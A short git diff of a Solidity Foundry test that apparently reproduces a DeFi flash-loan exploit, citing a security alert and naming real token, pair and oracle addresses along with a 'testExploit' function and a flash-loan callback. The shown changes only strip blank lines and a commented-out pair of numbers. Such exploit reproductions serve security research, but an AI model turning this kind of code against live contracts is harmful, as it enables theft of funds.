@@ -11,7 +11,6 @@ import "./interface.sol";
 
 // @Analysis - https://twitter.com/MetaTrustAlert/status/1667041877428932608
 
-
 contract ContractTest is Test {
     IDPPOracle DPPOracle =
         IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
@@ -19,7 +18,6 @@ contract ContractTest is Test {
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 UN = IERC20(0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F);
     IUniswapV2Pair Pair = IUniswapV2Pair(0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1);
-
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
@@ -34,7 +32,6 @@ contract ContractTest is Test {
 
     function testExploit() public {
         
-
         emit log_named_decimal_uint(
             "Attacker BUSD balance before attack",
             BUSD.balanceOf(address(this)),
@@ -51,9 +48,6 @@ contract ContractTest is Test {
         );
     }
 
-/*
-95520599080674615085411
-59365800773605713073164*/
     function DPPFlashLoanCall(
         address sender,
         uint256 baseAmount,
